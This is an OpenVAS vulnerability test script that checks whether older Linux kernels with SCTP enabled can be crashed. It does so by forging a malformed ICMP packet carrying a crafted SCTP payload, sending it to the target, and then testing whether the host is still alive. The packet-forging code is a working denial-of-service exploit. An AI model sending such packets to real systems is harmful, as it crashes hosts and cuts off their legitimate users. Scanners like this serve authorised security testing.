# OpenVAS Vulnerability Test
# $Id: linux_icmp_sctp_DoS.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Malformed ICMP Packets May Cause a Denial of Service (SCTP)
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
# Credits: Charles-Henri de Boysson 
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It is possible to crash the remote host by sending it malformed ICMP packets.

Description :

Linux Kernels older than version 2.6.13 contains a bug which may allow an
attacker to cause a NULL pointer dereference by sending malformed ICMP packets,
thus resulting in a kernel panic.

This flaw is present only if SCTP support is enabled on the remote host.

An attacker to make this host crash continuously, thus preventing legitimate 
users from using it.";

tag_solution = "Ugprade to Linux 2.6.13 or newer, or disable SCTP support.";

# Fixed in 2.6.13 vanilla kernel

if(description)
{
 script_id(19777);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:C/A:N");
 script_tag(name:"risk_factor", value:"High");
 script_name( "Malformed ICMP Packets May Cause a Denial of Service (SCTP)");
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);

 script_summary( "Kills the remote Linux with a bad ICMP packet");
 
 script_category(ACT_KILL_HOST);
 
 script_copyright("This script is Copyright (C) 2005 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
		       
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://oss.sgi.com/projects/netdev/archive/2005-07/msg00142.html");
 exit(0);
}

# include("global_settings.inc");

if(TARGET_IS_IPV6())exit(0);
start_denial();

src = this_host();
dst = get_host_ip();
id = rand();

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0xC0, ip_off: 0,
                        ip_p:IPPROTO_ICMP, ip_id: id, ip_ttl:0x40,
	     	        ip_src:this_host());
ip2 = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off: 0,
                        ip_p: 132, ip_id: id+1, ip_ttl:0x40,
	     	        ip_src:this_host(), 
			data: '\x28\x00\x00\x50\x00\x00\x00\x00\xf9\x57\x1F\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00');
icmp = forge_icmp_packet(ip:ip, icmp_type: 3, icmp_code:2,
	     		  icmp_seq: seq, icmp_id:seq, data: ip2);
send_packet(icmp, pcap_active: 0);

alive = end_denial();
if(!alive)
{
 security_hole();
 set_kb_item(name:"Host/dead", value:TRUE);
}

